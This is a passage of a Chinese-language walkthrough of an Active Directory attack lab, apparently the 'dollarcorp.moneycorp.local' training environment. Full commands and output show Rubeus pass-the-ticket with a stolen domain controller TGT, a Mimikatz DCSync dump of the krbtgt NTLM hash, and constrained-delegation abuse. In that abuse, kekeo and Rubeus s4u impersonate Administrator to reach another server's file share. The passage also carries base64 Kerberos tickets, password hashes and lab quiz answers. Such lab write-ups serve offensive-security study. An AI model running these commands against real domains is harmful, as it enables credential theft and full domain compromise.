  StartTime             :  2/14/2022 10:34:09 PM
  EndTime               :  2/15/2022 8:34:09 AM
  RenewTill             :  2/21/2022 1:00:49 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

doIFxTCCBcGgAwIBBaEDAgEWooIEmjCCBJZhggSSMIIEjqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBDYwggQyoAMCARKhAwIBAqKCBCQEggQgAofkSfMEPDetluumsJMry8ARJfAlyE8EKnm7Qg91biW0Flc8LqiyPfntatLcWNEnFWZqoVKMfjWRBCpRd7Bye2qIe9B4QtnDstjJGWuUeJ/thMsxMxKMp00GGASK4iv2aEGK+ZUz5ElsiJr4MYenJUR3FMDZ8uHoHoFyT2O9OMYA02K2F4EJY1cV0kwl4y/vEsFFcQcp62f0sATOLB/Fuz0qT+ATCMzUBOHDB9/i2uvrp96dTEEU1VdC6cihYRXxsfNAala7lP+bkp3K2dkxH/Rf8z/vocdlY0c/lo01ZhBatGm0aOJTlFNLsv/7wLxDx/WS51iAx2Vd6ionLuwSwBI8CyaXn7U/72Lzj2I9TJs9p1eoN9UMvmAQga2Qtt1aVGGedmOZZcFVsvAwuLUaatPCS1UlwljMikVkCp150zJY2ECZXmlHWcpmIU5QaoWN3RGFqzvp/Ruavh2rEAkv5/NHL8p2uPJp3VcEy4kgaF3mVvFX4GxnAl/okWXyhwQJX4BZ3Tf6922qcpSGxGMsD9Y+t0JDE9JrVdO4sgVFZn/tEJ7rAR/81p4w6QgLX8yxW5tsJDm9uEyfsu2w67K3tWcew6pKNNJLqN4ZQO8NK6jmieOq5vxV6IL5mn/LAS6RVQf43FY7Oan0dPlnJoFaIDpJKVO49H1TsWkGJBt15oCN1u8Arq6wE8JIBEU+LAw/jV9dSSIRyE+oJ1juHr1+47nDOBijoOS+qbq7clKPHZl0RdVDD0H847xAvWznAQpNsZlSui1/I1zYRq2uOvKdHiOOoJQi+cUwD01yqGKqWdhjknY/dL4JYWr7n+tYBwh+5fxL2/85H8xnR2TDr1tB/v4G07WQzip/zUT8P0uChgRYk7A2ATRTUYrmKZ1bPLbmd45f8477n0EQvhfKpkEyP9Qos3SI6fNtJRHPaO0B+biOaZLcoIfdWIPLNzVGVnGXjHbq+1hp6Q4OI7gYeXsqEYBZpspSMbId2VimqG4Bh8XAtPthpOw0YzrGA+6ZOtjHQmdzcKJyl3Py7wBXjqzwOj0I4Dp8EXzgVTitx7gSlJRumfGxt4OBrnLyDcE6iG1KmAuEaStZEtavskUJVhG4qfwKMbyGC1eagfdGYyPyOryW4tF+tVajxZY6UFyjNWNKjQXYM/JFDTEtBrltCn8o8amN/MYxo2H1SWM9XdEt6REJ+dc65w/PErZYFQtjqiPf2jtHWUGfNoEOm/3FrwADCiadC3pVfeEM68wI/ur4lV8ykw8g8ptoK34hq82qjmzDSWyA36JaCVaeN9C7cDHSiGtJ8BcIu3vwOR1BBgwjGorxOLM4ZGKmkDgDzdVOrtjYcsN3fpU8Osnoer+tIwkN3JYWpKoDxHJtTxRd8nc3kcipN0EOW4g3KlOvMYBTbJBTo4IBFTCCARGgAwIBAKKCAQgEggEEfYIBADCB/aCB+jCB9zCB9KArMCmgAwIBEqEiBCAPS1nJ2B4uyJ290hWYJVnxp98hbHcAgvtupb4NlKIbuKEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIWMBSgAwIBAaENMAsbCURDT1JQLURDJKMHAwUAYKEAAKURGA8yMDIyMDIxNTA2MzQwOVqmERgPMjAyMjAyMTUxNjM0MDlapxEYDzIwMjIwMjIxMjEwMDQ5WqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKkvMC2gAwIBAqEmMCQbBmtyYnRndBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUw=
```

怎么利用TGT？

利用命令：```.\Rubeus.exe ptt /ticket:<TGTofDCORP-DC$>```

执行
```
PS C:\ad> .\Rubeus.exe ptt /ticket:doIFxTCCBcGgAwIBBaEDAgEWooIEmjCCBJZhggSSMIIEjqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBDYwggQyoAMCARKhAwIBAqKCBCQEggQgAofkSfMEPDetluumsJMry8ARJfAlyE8EKnm7Qg91biW0Flc8LqiyPfntatLcWNEnFWZqoVKMfjWRBCpRd7Bye2qIe9B4QtnDstjJGWuUeJ/thMsxMxKMp00GGASK4iv2aEGK
5ElsiJr4MYenJUR3FMDZ8uHoHoFyT2O9OMYA02K2F4EJY1cV0kwl4y/vEsFFcQcp62f0sATOLB/Fuz0qT+ATCMzUBOHDB9/i2uvrp96dTEEU1VdC6cihYRXxsfNAala7lP+bkp3K2dkxH/Rf8z/vocdlY0c/lo01ZhBatGm0aOJTlFNLsv/7wLxDx/WS51iAx2Vd6ionLuwSwBI8CyaXn7U/72Lzj2I9TJs9p1eoN9UMvmAQga2Qtt1aVGGedmOZZcFVsvAwuLUaatPCS1UlwljMikVkCp150zJY2ECZXmlHWcpmIU5QaoWN3RGFqzvp/Ruavh2rEAkv5/NHL8p2uPJp3VcEy4kgaF3mVvF
nAl/okWXyhwQJX4BZ3Tf6922qcpSGxGMsD9Y+t0JDE9JrVdO4sgVFZn/tEJ7rAR/81p4w6QgLX8yxW5tsJDm9uEyfsu2w67K3tWcew6pKNNJLqN4ZQO8NK6jmieOq5vxV6IL5mn/LAS6RVQf43FY7Oan0dPlnJoFaIDpJKVO49H1TsWkGJBt15oCN1u8Arq6wE8JIBEU+LAw/jV9dSSIRyE+oJ1juHr1+47nDOBijoOS+qbq7clKPHZl0RdVDD0H847xAvWznAQpNsZlSui1/I1zYRq2uOvKdHiOOoJQi+cUwD01yqGKqWdhjknY/dL4JYWr7n+tYBwh+5fxL2/85H8xnR2TDr1tB/v4G07
p/zUT8P0uChgRYk7A2ATRTUYrmKZ1bPLbmd45f8477n0EQvhfKpkEyP9Qos3SI6fNtJRHPaO0B+biOaZLcoIfdWIPLNzVGVnGXjHbq+1hp6Q4OI7gYeXsqEYBZpspSMbId2VimqG4Bh8XAtPthpOw0YzrGA+6ZOtjHQmdzcKJyl3Py7wBXjqzwOj0I4Dp8EXzgVTitx7gSlJRumfGxt4OBrnLyDcE6iG1KmAuEaStZEtavskUJVhG4qfwKMbyGC1eagfdGYyPyOryW4tF+tVajxZY6UFyjNWNKjQXYM/JFDTEtBrltCn8o8amN/MYxo2H1SWM9XdEt6REJ+dc65w/PErZYFQtjqiPf2jtHW
oEOm/3FrwADCiadC3pVfeEM68wI/ur4lV8ykw8g8ptoK34hq82qjmzDSWyA36JaCVaeN9C7cDHSiGtJ8BcIu3vwOR1BBgwjGorxOLM4ZGKmkDgDzdVOrtjYcsN3fpU8Osnoer+tIwkN3JYWpKoDxHJtTxRd8nc3kcipN0EOW4g3KlOvMYBTbJBTo4IBFTCCARGgAwIBAKKCAQgEggEEfYIBADCB/aCB+jCB9zCB9KArMCmgAwIBEqEiBCAPS1nJ2B4uyJ290hWYJVnxp98hbHcAgvtupb4NlKIbuKEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIWMBSgAwIBAaENMAsbCURDT1JQ
JKMHAwUAYKEAAKURGA8yMDIyMDIxNTA2MzQwOVqmERgPMjAyMjAyMTUxNjM0MDlapxEYDzIwMjIwMjIxMjEwMDQ5WqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKkvMC2gAwIBAqEmMCQbBmtyYnRndBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUw=

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: Import Ticket
[+] Ticket successfully imported!
```

导入成功

用klist命令查看ticket
```
[+] Ticket successfully imported!
PS C:\ad> klist

Current LogonId is 0:0x2a582

Cached Tickets: (1)

#0>     Client: DCORP-DC$ @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 2/14/2022 22:34:09 (local)
        End Time:   2/15/2022 8:34:09 (local)
        Renew Time: 2/21/2022 13:00:49 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

因为现在我们已经有了DA权限，可以使用dcsync导出dcorp\krbtgt的NTML哈希
```
PS C:\ad> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::dcsync /user:dcorp\krbtgt
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 2/16/2019 11:01:46 PM
Object Security ID   : S-1-5-21-1874506631-3219952063-538504511-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: ff46a9d8bd66c6efd77603da26796f35
    ntlm- 0: ff46a9d8bd66c6efd77603da26796f35
    lm  - 0: b14d886cf45e2efb5170d4d9c4085aa2
```

问题：Domain user who is a local admin on dcorp-appsrv
答案：appadmin

问题：Which Domain Admin's credentials are compromised
答案：Administrator

问题：Which user's credentials are compromised by using the printer bug
答案：DCORP-DC$


# Learning Objective 18:

>Task
>● Enumerate users in the domain for whom Constrained Delegation is enabled.
>− For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured.
>− Pass the ticket and access the service.
>● Enumerate computer accounts in the domain for which Constrained Delegation is enabled.
>− For such a user, request a TGT from the DC.
>− Obtain an alternate TGS for LDAP service on the target machine.
>− Use the TGS for executing DCSync attack.


## 枚举约束委派的用户，需要用dev版本Powerview
```
PS C:\ad> . .\PowerView_dev.ps1
PS C:\ad> Get-DomainUser –TrustedToAuth
logoncount               : 27
badpasswordtime          : 12/31/1600 4:00:00 PM
distinguishedname        : CN=web svc,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass              : {top, person, organizationalPerson, user}
displayname              : web svc
lastlogontimestamp       : 2/15/2022 5:33:56 AM
userprincipalname        : websvc
name                     : web svc
objectsid                : S-1-5-21-1874506631-3219952063-538504511-1113
samaccountname           : websvc
codepage                 : 0
accountexpires           : NEVER
countrycode              : 0
whenchanged              : 2/15/2022 1:33:56 PM
instancetype             : 4
usncreated               : 14488
objectguid               : 8862b451-0bc9-4b26-8ffb-65c803cc74e7
sn                       : svc
lastlogoff               : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
serviceprincipalname     : {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-adminsrv}
givenname                : web
lastlogon                : 2/15/2022 6:17:36 AM
badpwdcount              : 0
cn                       : web svc
whencreated              : 2/17/2019 1:01:06 PM
primarygroupid           : 513
pwdlastset               : 2/17/2019 5:01:06 AM
```

留意：```msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}```,这里表示websvc可以被利用进入dcorp-mssql的文件系统

由于我们之前已经枚举到了websvc的ntml哈希,这里直接利用

```
websvc：cc098f204c5887eaa8253e7c2749156f
```

### 方法一：kekeo.exe
使用kekeo的 tgt::ask模块，向websvc请求一个TGT
```
PS C:\ad> .\kekeo.exe

  ___ _    kekeo 2.1 (x64) built on Jun 15 2018 01:01:01 - lil!
 /   ('>-  "A La Vie, A L'Amour"
 | K  |    /* * *
 \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  L\_       http://blog.gentilkiwi.com/kekeo                (oe.eo)
                                             with  9 modules * * */

kekeo # tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
Realm        : dollarcorp.moneycorp.local (dollarcorp)
User         : websvc (websvc)
CName        : websvc   [KRB_NT_PRINCIPAL (1)]
SName        : krbtgt/dollarcorp.moneycorp.local        [KRB_NT_SRV_INST (2)]
Need PAC     : Yes
Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): cc098f204c5887eaa8253e7c2749156f
[kdc] name: dcorp-dc.dollarcorp.moneycorp.local (auto)
[kdc] addr: 172.16.2.1 (auto)
  > Ticket in file 'TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
```

现在我们有了TGT，向dcorp-mssql请求一个TGS。需要注意，这个TGS只有进入系统的权限，不能执行系统命令

```
kekeo # tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
Ticket  : TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi
  [krb-cred]     S: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: websvc @ DOLLARCORP.MONEYCORP.LOCAL
  [enc-krb-cred] S: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
  [enc-krb-cred] T: [2/15/2022 7:20:11 AM ; 2/15/2022 5:20:11 PM] {R:2/22/2022 7:20:11 AM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 996b1f2a3973f2cad8d252b6ad5c47b2d2ee2a0de2dbb2f4eb37128d22011c20
  [s4u2self]  Administrator@dollarcorp.moneycorp.local
[kdc] name: dcorp-dc.dollarcorp.moneycorp.local (auto)
[kdc] addr: 172.16.2.1 (auto)
  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_websvc@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
Service(s):
  [s4u2proxy] cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
```

生成了一个TGS，使用Invoke-Mimikatz注入到内存当中
```
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi

* File: 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi': OK
```

查看dcorp-mssql，看是否能列出文件列表（因为我们只有查看文件的权限）
```
PS C:\ad> ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$


    Directory: \\dcorp-mssql.dollarcorp.moneycorp.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/16/2016   6:18 AM                PerfLogs
d-r---        2/17/2019   5:19 AM                Program Files
d-----        2/17/2019   5:17 AM                Program Files (x86)
d-----        8/21/2020   4:24 AM                Transcripts
d-r---        2/17/2019   5:21 AM                Users
d-----        8/20/2020   4:02 AM                Windows
```

### 方法二：Rubeus.ex

使用rebuse滥用约束委托，可以在一条命令里请求TGT和TGS

```
.\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:"CIFS/dcorpmssql.dollarcorp.moneycorp.LOCAL" /ptt
```

执行：
```
PS C:\ad> .\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:"C
IFS/dcorpmssql.dollarcorp.moneycorp.LOCAL" /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: S4U

[*] Using rc4_hmac hash: cc098f204c5887eaa8253e7c2749156f
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\websvc'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFSjCCBUagAwIBBaEDAgEWooIENzCCBDNhggQvMIIEK6ADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOC
      A9MwggPPoAMCARKhAwIBAqKCA8EEggO9IzMEfYN5FDjw8I5ucstYJ/7/MyJ4O/vJwYzG+x+wwy2t+riS
      h8TkgtlpZgRIDwVM6ffAp7EHtI0vgxy+kDjVCtv7HBoiixHp+Bfx8Zyumcg02B5GGp9G3si/tbHpTMdF
      bJ/0bZL1hf56xvhxAEiMHrN1fjk0+PXdhVN7HOcKp3PRi8vV5yZw7zJks5bp+fXmYt4EAR3yjp/Olo8P
      BOsfWf9AAt1zF74leMfsBKH72E/FemoSKiQRcKeTJM2ZgKWGrWcrX8NJaqDxA23cgVW+IhYqfOvLFfp+
      h31nMNNystzcq7ZcvaTA3GsnSWyvlvTvI9oI7ZH8a6kjbrmX/ng0imGk2X1frTwUqYYihySC0kSQtp+K
      Npfn18/t1oXzmg6626vT511oRmBpswe1pci2oB3gr0Bt7Tk/0UGu9vXb/RN00c4cyse54HpQup8C0QUa
      kUUtjkTNHPQ3kUztpJ1SEkmbf0f4hoQyh/C5C0DTeWnjXG8/eyKYiR/t6mh1e9s/xU4RgMewMLEaKi1n
      XpOjaXT/eh7z+qysi1OmtICRdaUgClrSGiTwLdg3xOua6HtHf3ZUx+K2W0vGFHVoIsm8TWr5Fj9XU2Fg
      41L9h+8W3Ccz2GlwyCA0eASSL+O5++PB2DCXiZCyubih0iwulUylWz2Ow9jSJDjw1g9Qnw6BzHEzQter
      jGPYuIGhNkeXf0JTf7kf0bY/GxccTG4w/ZuIVEEgtjPYsnemlWOtj3md1DBIK843nqiaPBbSJ9jX7J2y
      sOuBxNtKaZ086SP4BuGmAMlVge8YbJV/QGhjMgd2TLhF9BsCN20jmYdGhAFakKV81wFwluCjRkEI1+Am
      Xdv+gdSYCFwH/m1/+nj3NsLpd4Xwka0OiZTueeYOL72kBkm7s1oAuekzBBAjCf7dzGshOEu+NvNnF7/r
      9/bfnYMs3LGqLvHV2BEDv/1iQfiuTHWJ9KOUaECYgj+NYfcRFfFptIJNwRReQPw6UWQNYRz9wgGbRmWN
      EvZzJOLKdQNbBLzx4UaJBVlth/KI8NogQ9nRsMuS5srGDNu96qThelyL+wFsDrViQ9cm2qnBE+C7k6Nm
      OYLjx2XNzgsCOMZxvngJd97qwFKfhppYUMZLG2fn8jxcA3izs7AhHbCe5AGOqqeqKO4clahAOWrCJR2T
      a0uI/yBxkfTDYn93GWU4Rvu5gDv/2wjHoyCENOPwKmxqBfbxJmRUjw7tnZZHjeHs9UgsWVKZUPCPz17K
      hV+S8YV7MGUMBfTFnjYav2S9rMnso4H+MIH7oAMCAQCigfMEgfB9ge0wgeqggecwgeQwgeGgGzAZoAMC
      ARehEgQQ2PgsAtOn0pHqhsobyCRriaEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKITMBGgAwIB
      AaEKMAgbBndlYnN2Y6MHAwUAQOEAAKURGA8yMDIyMDIxNTE1NDYyOFqmERgPMjAyMjAyMTYwMTQ2Mjha
      pxEYDzIwMjIwMjIyMTU0NjI4WqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKkvMC2gAwIBAqEm
      MCQbBmtyYnRndBsaZG9sbGFyY29ycC5tb25leWNvcnAubG9jYWw=


[*] Action: S4U

[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Building S4U2self request for: 'websvc@DOLLARCORP.MONEYCORP.LOCAL'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'Administrator@DOLLARCORP.MONEYCORP.LOCAL' to 'websvc@DOLLARCORP.MONEYCORP.LOCAL'
[*] base64(ticket.kirbi):

      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
      GwZ3ZWJzdmM=

[+] Ticket successfully imported!
[*] Impersonating user 'Administrator' to target SPN 'CIFS/dcorpmssql.dollarcorp.moneycorp.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Building S4U2proxy request for service: 'CIFS/dcorpmssql.dollarcorp.moneycorp.LOCAL'
[*] Sending S4U2proxy request

[X] KRB-ERROR (7) : KDC_ERR_S_PRINCIPAL_UNKNOWN
```

查看dcorp-mssql的C盘,证明已经有进入dcorp-mssql的权限
```
PS C:\ad> ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$


    Directory: \\dcorp-mssql.dollarcorp.moneycorp.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/16/2016   6:18 AM                PerfLogs
d-r---        2/17/2019   5:19 AM                Program Files
d-----        2/17/2019   5:17 AM                Program Files (x86)
d-----        8/21/2020   4:24 AM                Transcripts
d-r---        2/17/2019   5:21 AM                Users
d-----        8/20/2020   4:02 AM                Windows
```



## 枚举约束委派的计算机，需要用dev版本Powerview
```
PS C:\ad> Get-DomainComputer –TrustedToAuth


logoncount                    : 157
badpasswordtime               : 2/18/2019 6:39:39 AM
distinguishedname             : CN=DCORP-ADMINSRV,OU=Applocked,DC=dollarcorp,DC=moneycorp,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
lastlogontimestamp            : 2/10/2022 10:51:48 PM
objectsid                     : S-1-5-21-1874506631-3219952063-538504511-1114
samaccountname                : DCORP-ADMINSRV$
localpolicyflags              : 0
codepage                      : 0
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 2/11/2022 6:51:48 AM
instancetype                  : 4
usncreated                    : 14594
objectguid                    : eda89f4e-dfec-429a-8b78-fe55624b85c9
operatingsystem               : Windows Server 2016 Standard
operatingsystemversion        : 10.0 (14393)
lastlogoff                    : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto      : {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata         : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
serviceprincipalname          : {TERMSRV/DCORP-ADMINSRV, TERMSRV/dcorp-adminsrv.dollarcorp.moneycorp.local, WSMAN/dcorp-adminsrv, WSMAN/dcorp-adminsrv.dollarcorp.moneycorp.local...}
lastlogon                     : 2/15/2022 7:10:20 AM
iscriticalsystemobject        : False
usnchanged                    : 631187
cn                            : DCORP-ADMINSRV
msds-supportedencryptiontypes : 28
whencreated                   : 2/17/2019 1:24:51 PM
primarygroupid                : 515
pwdlastset                    : 4/15/2019 8:55:19 AM
name                          : DCORP-ADMINSRV
